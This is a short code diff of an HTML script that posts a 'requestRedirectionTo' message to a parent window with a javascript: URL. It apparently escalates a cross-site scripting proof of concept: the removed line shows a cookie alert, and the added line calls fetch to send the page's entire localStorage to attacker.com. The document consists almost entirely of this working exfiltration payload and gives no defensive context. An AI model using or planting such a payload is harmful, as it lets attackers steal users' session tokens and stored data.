@@ -1,6 +1,6 @@
 <script>
 parent.postMessage({
     action: "requestRedirectionTo",
-    targetUrlStr: "javascript:alert(document.cookie)"
+    targetUrlStr: "javascript:fetch('https://attacker.com/steal?data=' + encodeURIComponent(JSON.stringify(localStorage)))"
 }, "*");
 </script>
